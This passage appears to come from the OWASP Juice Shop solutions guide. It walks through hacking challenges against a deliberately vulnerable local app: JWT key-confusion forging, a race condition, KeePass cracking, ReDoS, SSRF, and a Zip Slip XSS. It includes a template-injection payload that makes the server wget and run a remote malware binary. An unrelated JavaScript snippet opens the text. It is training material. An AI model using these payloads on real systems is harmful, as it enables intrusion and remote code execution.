   var hashids = new Hashids("this is my salt", 60, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890");

  var id = hashids.encode(999);
  var numbers = hashids.decode(id);

  $("#input").text("["+numbers.join(", ")+"]");
  $("#output").text(id);

=== Forge an almost properly RSA-signed JWT token

==== With Burp Suite

. Use your favorite forced directory browsing tool (or incredible
guessing luck) to identify http://localhost:3000/encryptionkeys as
having directory listing enabled.
. Download the application's public JWT key from
http://localhost:3000/encryptionkeys/jwt.pub
+
image::appendix/jwt2-findkey.PNG[encryption keys]

. Download and install the
https://portswigger.net/burp/communitydownload[Burp Suite Community Edition]
. In the _BApp Store_ tab under the _Extender_ tab within Burp Suite
find and install the
https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61[JSON Web Token Attacker]
extension (aka _JOSEPH_)
+
image::appendix/jwt2-burpextension.PNG[load extension]

. Send any captured request that has an `Authorization: Bearer` token
to Burp's _Repeater_.
. Once in _Repeater_, click the _JWS_ tab, then the _Payload_ tab
beneath and modify the email parameter to be `rsa_lord@juice-sh.op`.
+
image::appendix/jwt2-request.PNG[modify payload]

. Next, click the _Attacker_ tab, select _Key Confusion_, then click
_Load_.
. Paste in the contents of the `jwt.pub` file without the `-----BEGIN
RSA PUBLIC KEY-----` and `-----END RSA PUBLIC KEY-----` lines.
+
image::appendix/jwt2-keyconfusion.PNG[key confusion]

. Click _Update_ and then _Go_ in the top left to send the modified
request via Burp and solve this challenge!

👏 Kudos to https://github.com/ZonkSec[Tyler Rosonke] for providing
this solution.

==== With Linux and online tools

. Download the application's public JWT key from
http://localhost:3000/encryptionkeys/jwt.pub
. The authentication token is of form
`header_base64url.payload_base64url.signature_base64url`. Copy the
JWT header from a request, decode it and change the algorithm to
HS256 using a tool like https://cryptii.com/. +
The server uses a private RSA key to sign the token and a public one
to verify it when using RS256, but when using HS256 there is only one
key for both, and, for verification, the server always uses the
public RSA key disregarding the algorithm specified in the header.
image:appendix/token_header_encode.png[edit header]
. Edit the email in the payload to `rsa_lord@juice-sh.op`.
image:appendix/token_payload_encode.png[edit body]
. Encode the server key to hex `cat jwt.pub | xxd -p | tr -d "\\n"`
. Sign your new token with the server key with hmac `echo -n
"new_header.new_payload" | openssl dgst -sha256 -mac HMAC -macopt
hexkey:server_key_hex`
. Encode your signature to base64url: `echo -n "signature" | xxd -r -p
| base64 | sed 's/+/-/g; s/\//_/g; s/=//g' | tr -d "\\n"`
. Place the new token in a cookie or send an authenticated request with
the it to solve the challenge.

👏 Kudos to https://github.com/teodor440[teodor440] for providing this
solution.

=== Like any review at least three times as the same user

. Liking a review normally results in a request to
http://localhost:3000/rest/products/reviews which associates the
email of the user with the review (identified by the JSON body of
e.g. `{id: "ZQdzyRCbwQ4ys3PCG"}`) and also increases its like counter
by one.
. If you try to replay the same request you will get a `403 Forbidden`
HTTP status with `{"error":"Not allowed"}` in the response.
. Write a script that simultaneously executes three requests to
http://localhost:3000/rest/products/reviews with body e.g. `{id:
"ZQdzyRCbwQ4ys3PCG"}` and run it.
. If your 3 requests get handled asynchronously within an (artificial)
150ms time window, you will cause a race condition and all will get
through and each increase the like counter by one to a total of
three!
. Back in your browser you should now see the corresponding challenge
marked as solved!

The following https://github.com/aaronhnatiw/race-the-web[RaceTheWeb]
config does the trick as well:

[,toml]
----
# Multiple Likes
# Save this as multiple-likes.toml
# Get comment information from this endpoint first: http://localhost:3000/rest/products/<id>/reviews
# Then repalce id values in body parameter of this file
# You need to replace the bearer token as well
# open browser dev tools, like any of the comment, then inspect the traffic to obtain a valid bearer token
# Launch this file by doing ./racethweb multiple-likes.toml
count = 3
verbose = true
[[requests]]
    method = "POST"
    url = "http://localhost:3000/rest/products/reviews"
    body = "{\"id\":\"QEBb8RKLor69dsXkB\"}"
    headers = ["Content-Type: application/json","Authorization: Bearer XXX"]
----

=== Log in with the support team's original user credentials

_Solving this challenge requires http://keepass.info[KeePass 2.x]
installed on your computer. If you are using a non-Windows OS you can
try using some unofficial port but there is no guarantee the file can be
opened on those._

. Find out that the support team's email address is `support@juice-sh.op` eiher via deduction of the pattern from other users or by completing the <<_retrieve_a_list_of_all_user_credentials_via_sql_injection,Retrieve a list of all user credentials via SQL Injection>> challenge.
. Brute forcing the password on of this user <httpc://localhost:3000/#/login> is an entirely hopeless approach.
. You might notice that the support team has a KeePass database file located in
http://localhost:3000/ftp/incident-support.kdbx and that it
is conveniently _not blocked_ by the file type filter otherwise protecting this folder.
. Download and install KeePass 2.x from http://keepass.info
. Trying to brute force the password on this KeePass file is unlikely to succeed at this stage.
. Inspecting `main.js` for information leakage (e.g. by
searching for `support`) will yield an interesting log statement that
is printed when the support logs in with the wrong password:
+
image::appendix/minified-js_support-hint.png[Support team login hint in minified JS]

. The logged text is in Romanian language: `Parola echipei de asistență nu respectă politica corporativă pentru conturile privilegiate! Vă rugăm să schimbați parola în consecință!`
. Running this through an online translator yields something like:
`The password of the support team does not respect the corporate policy for privileged accounts! Please change your password accordingly!`
. More interesting even is the Regular Expression `(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,30}` being used to check for a specific password pattern. You can assume that this is the equivalent of the mentioned corporate policy.
. This RegEx translates into the following password requirements
 ** a minimum length of 12 characters
 ** a maximum length of 30 characters
 ** at least one lowercase character `a-z`
 ** at least one uppercase character `A-Z`
 ** at least one number `0-9`
 ** at least one special character `@$!%*?&`
. Note also, that this RegEx would not accept _any other_ special characters or letters than the ones mentioned above.
. Assume that the support team followed the password policy for its user password _and_ also for its KeePass file.
. Furthermore, presume that they might have used a weaker password on their KeePass database, because their normal workflow might involve getting the user credentials from it when logging in to the application. Therefore, the KeePass file should be easier to break into.
. Use a brute force script (applying the password pattern restrictions known to you) to break into the KeePass file with the terribly chosen password `Support2022!`.
. Find the password for the support team user account in the `prod`
entry of the KeePass file.

. This is a cipher text that came out of an AES-encryption using AES256
in CBC mode.
. To get the key and the IV, you should run a _Forced Directory
Browsing_ attack against the application. You can use OWASP ZAP for
this purpose.
 .. Of the word lists coming with OWASP ZAP only
`directory-list-2.3-big.txt` and
`directory-list-lowercase-2.3-big.txt` contain the directory with
the key file.
 .. The search will uncover http://localhost:3000/encryptionkeys as
a browsable directory

 .. Open http://localhost:3000/encryptionkeys/premium.key to
retrieve the AES encryption key `EA99A61D92D2955B1E9285B55BF2AD42`
and the IV `1337`.
. In order to decrypt the cipher text, it is best to use `openssl`.

=== Perform a Remote Code Execution that occupies the server for a while without using infinite loops

. Follow steps 1-7 of the challenge
<<_perform_a_remote_code_execution_that_would_keep_a_less_hardened_application_busy_forever,Perform a Remote Code Execution that would keep a less hardened application busy forever>>.
. As _Request Body_ put in `{"orderLinesData":
"/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}` - which will
trigger a very costly Regular Expression test once executed.
. Submit the request by clicking _Execute_.
. The server should eventually respond with a `503` status and an error
stating `Sorry, we are temporarily not available! Please try again
later.` after roughly 2 seconds. This is due to a defined timeout so
you do not really DoS your Juice Shop server.

=== Request a hidden resource on server through server

. Solve
<<_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution,Infect the server with "juicy malware" by abusing arbitrary command execution>>
at least to the point where you have access to the "juicy malware"
executables.
. Similar to that SSTi challenge, the vulnerable place for this one is
found on the http://localhost:3000/profile page.
. The only promising input field for an SSRF attack is the _Gravatar
URL_. Open your browser's DevTools and watch the _Network_ tab.
. Type any URL (e.g. https://placekitten.com/100/100) into _Gravatr
URL_ and click _Link Gravatar_. You will realize a request
http://localhost:3000/profile/image/url with the
chosen https://placekitten.com/100/100 as parameter `imageUrl`.
. You will find no HTTP request to https://placekitten.com/100/100
going out from your browser, though. As the image was retrieved and
associated with your profile, it must have been downloaded _by the
Juice Shop server_.
+
image::appendix/ssrf_placekitten.png[Placekitten image associated with a user profile]

. To solve this challenge, you need to find a secret URL hidden inside
the "juicy malware" and simulate a self-targeted SSRF attack with it.
. Use your favorite decompiler(s) to see what is going on inside the
malware program...
. ...or execute the malware while tunneling all its traffic through a
proxy.
. Either way you should be able to identify the URL being called by it
is
http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
. Visiting that URL directly will not do anything, as it needs to be
called through the _Gravatar Link_ field that was presumably
vulnerable to SSRF
. Paste the URL in and click _Link Gravatar_ to get the expected
challenge solved notification!

=== Infect the server with juicy malware by abusing arbitrary command execution

. Perform the totally obvious Google search for `juicy malware` to find
https://github.com/J12934/juicy-malware
. Alternatively you also find three `.url` files with direct links in
http://localhost:3000/ftp/quarantine but you'll probably need to
understand how to solve any of
<<_access_a_developers_forgotten_backup_file,Access a developer's forgotten backup file>>,
<<_access_a_salesmans_forgotten_backup_file,Access a salesman's forgotten backup file>>
or
<<_access_a_misplaced_siem_signature_file,Access a misplaced SIEM signature file>>
first.
. Your goal is to use RCE to make the server download and execute the
malware version for the server OS, so on Linux you might want to run
something like `+wget -O malware
https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
&& chmod +x malware && ./malware+`
. You probably realized by now that http://localhost:3000/profile is
not an Angular page? This page is written using
https://pugjs.org[Pug] which happens to be a Template engine and
therefore perfectly suited for SSTi mischief.
. Set your _Username_ to `1+1` and click _Set Username_. Your username
will be just shown as `1+1` under the profile picture.
. Trying template injection into Pug set _Username_ to `#{1+1}` and
click _Set Username_. Your username will now be shown as `2` under
the profile picture!
. Craft a payload that will abuse the lack of encapsulation of
JavaScript's `global.process` object to dynamically load a library
that will allow you to spawn a process on the server that will then
download and execute the malware.
. The payload might look like
`+#{global.process.mainModule.require('child_process').exec('wget -O
malware
https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
&& chmod +x malware && ./malware')}+`. Submit this as _Username_ and
(on a Linux server) the challenge should be marked as solved

ℹ️ Remember that you need to use the right malware file for your
server's operation system and also their synonym command for `wget`.

=== Embed an XSS payload into our promo video

. The author

back in `v8.5.0` from his personal account, openly spoilering the URL
http://localhost:3000/promotion
+
image::appendix/tweet_promotion.png[Tweet promoting a new in-app promotion video]

. After changing the video sported on the promotion page in `v12.5.0`,
the Juice Shop's own Twitter account
https://twitter.com/owasp_juiceshop/status/1350381894010077184[published another message],
this time spoilering the URL http://demo.owasp-juice.shop/promotion
+
image::appendix/tweet_promotion2.png[Tweet promoting the OWASP membership ad promotion video]

. Visit http://localhost:3000/promotion to watch the video
advertising
https://owasp.org/membership/[the benefits of an OWASP membership]!
You will notice that it comes with subtitles enabled by default.
+
image::appendix/promo_video.png[In-app promotion video]

. Right-click and select _View Source_ on the page to learn that it
loads its video from http://localhost:3000/video and that the
subtitles are directly embedded in the page itself.
. Inspecting the response for http://localhost:3000/video in the
_Network_ tab of your DevTools shows an interesting header
`Content-Location: /assets/public/videos/owasp_promo.mp4`
. Trying to access the video directly at
http://localhost:3000/assets/public/videos/owasp_promo.mp4 works
fine.
. Getting a directory listing for
http://localhost:3000/assets/public/videos does not work
unfortunately.
. Knowing that the subtitles are in
https://www.w3.org/TR/webvtt1/[WebVTT] format (from step 3) a lucky
guess would be that a corresponding `.vtt` file is available
alongside the video.
. Accessing
http://localhost:3000/assets/public/videos/owasp_promo.vtt proves
this assumption correct.
. As the subtitles are not loaded separately by the client, they must
be embedded on the server side. If this embedding happens without
proper safeguards, an XSS attack would be possible if the subtitles
files could be overwritten.
. The prescribed XSS payload also hints clearly at the intended attack
against the subtitles, which are themselves enclosed in a `<script>`
tag, which the payload will try to close prematurely with its
starting `</script>`.
. To successfully overwrite the file, the Zip Slip vulnerability
behind the
<<overwrite-the-legal-information-file,Overwrite the Legal Information file>>
challenge can be used.
. The blind part of this challenge is the actual file location in the
server file system. Trying to create a Zip file with any path trying
to traverse into `../../assets/public/videos/` will fail. Notice
that `../../` was sufficient to get to the root folder in
<<overwrite-the-legal-information-file,Overwrite the Legal Information file>>.
. This likely means that there is a deeper directory structure in
which `assets/` resides.
. This actual directory structure on the server is created by the
AngularCLI tool when it compiles the application, but is unfortunately not fully leaked anywhere in the client-side code.
. You can get a hint on a possible base directory `frontend/` from http://localhost:3000/main.js and several other JavaScript files you find in the _Sources_ tab of your Browser's DevTools from the fact that they all start with `"use strict";(self.webpackChunkfrontend=self.webpackChunkfrontend||[])` where `frontend` is the Angular project name.
. Trying `../../frontend/assets/public/videos/` will still fail as your Zip Slip directory traversal payload.
. Either by intense brute-forcing, lucky guessing or heavy googling you might eventually end up with a path prefix of
`frontend/dist/frontend/` in which `assets/` resides on the server. Thus, the path you need to work with, is `frontend/dist/frontend/assets/`. Note that there really is no "right" way to find this out, but here are some possible ways:
 ** You can easily find many Angular examples where some `dist/` folder is involved in the application packaging
 ** Via Google you might stumble across https://vorozco.com/blog/2019/2019-09-11-Packagin-Angular-8-Apps-War.html which mentions `<directory>src/main/frontend/dist/frontend</directory>` as their package folder.
 ** You could create a list of possible involved package names and then create different Zip Slip payloads for these, adding one and eventually two additional recursions into deeper directory levels.
 ** As long as `frontend` and `dist` are in your list, you will end up with the right permutation of `frontend/dist/frontend` on a depth level of 3 eventually.
. Prepare a ZIP file with a `owasp_promo.vtt` inside that contains the
prescribed payload of `</script><script>alert(`xss`)</script>`
with `zip exploit.zip
../../frontend/dist/frontend/assets/public/video/owasp_promo.vtt`
(on Linux).
. Upload the ZIP file on http://localhost:3000/#/complain.
. The challenge notification will not trigger immediately, as it
requires you to actually execute the payload by visiting
http://localhost:3000/promotion again.
. You will see the alert box and once you go _Back_ the challenge
solution should trigger accordingly.
